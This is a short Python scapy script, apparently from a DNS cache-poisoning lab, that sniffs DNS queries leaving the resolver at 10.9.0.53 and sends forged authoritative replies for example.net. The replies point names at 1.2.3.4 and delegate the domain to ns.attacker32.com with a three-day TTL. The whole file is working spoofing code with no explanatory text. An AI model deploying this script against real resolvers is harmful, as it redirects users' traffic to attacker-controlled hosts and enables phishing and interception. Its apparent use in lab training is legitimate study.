#!/usr/bin/env python3
from scapy.all import *
def spoof_dns_replies(pkt):
    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Response to the client
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)  # Standard DNS port
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=259200)  # Spoofed IP
        NSsec = DNSRR(rrname="example.net", type='NS', rdata='ns.attacker32.com', ttl=259200)
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            qr=1,
            rd=0,
            qdcount=1,
            ancount=1,
            nscount=1,
            an=Anssec,
            ns=NSsec,

        )
        spoofpkt = IPpkt / UDPpkt / DNSpkt  
        send(spoofpkt)

sniff(filter='udp and (src host 10.9.0.53 and dst port 53)', prn=spoof_dns_replies)